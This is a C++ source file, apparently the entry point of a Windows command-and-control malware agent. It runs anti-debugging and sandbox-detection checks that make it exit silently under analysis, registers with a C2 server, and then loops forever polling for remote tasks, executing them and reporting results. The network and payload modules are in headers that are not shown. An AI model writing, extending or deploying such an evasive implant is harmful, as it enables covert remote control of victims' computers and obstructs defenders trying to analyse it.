// Enhanced C2 Agent - Modular Architecture
// Refactored from monolithic design to professional modular structure

#define no_init_all
#define _CRT_SECURE_NO_WARNINGS

#include "core/config.h"
#include "core/agent.h"
#include "core/communication.h"
#include "utils/anti_debug.h"

#include <windows.h>

#ifdef _DEBUG
int main(void)
#else
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
#endif
{
    // Initialize the configuration system
    if (!Config::Initialize()) {
        ExitProcess(1);
    }

    // Initialize communication subsystem
    if (!Core::Communication::Initialize()) {
        Config::Cleanup();
        ExitProcess(1);
    }

    // Perform comprehensive anti-debugging and anti-analysis checks
    if (Utils::AntiDebug::IsBeingDebugged()) {
        // Silent exit if debugging/analysis detected
        Core::Communication::Cleanup();
        Config::Cleanup();
        ExitProcess(0);
    }

    // Additional analysis environment detection
    if (Utils::AntiDebug::IsAnalysisEnvironment()) {
        Core::Communication::Cleanup();
        Config::Cleanup();
        ExitProcess(0);
    }

    // Register with the C2 server
    if (!Core::Agent::RegisterWithServer()) {
        PRINTF("[ERROR] Failed to register with server. Exiting.\n");
        Core::Communication::Cleanup();
        Config::Cleanup();
        ExitProcess(0);
    }

    // Start the main agent execution loop
    // This function will run indefinitely, handling:
    // - Task polling from the C2 server
    // - Task execution via the task manager
    // - Result reporting back to server
    // - Sleep/jitter timing management
    Core::Agent::RunMainLoop();

    // Cleanup (should never be reached due to infinite loop)
    Core::Communication::Cleanup();
    Config::Cleanup();
    
    return 0;
}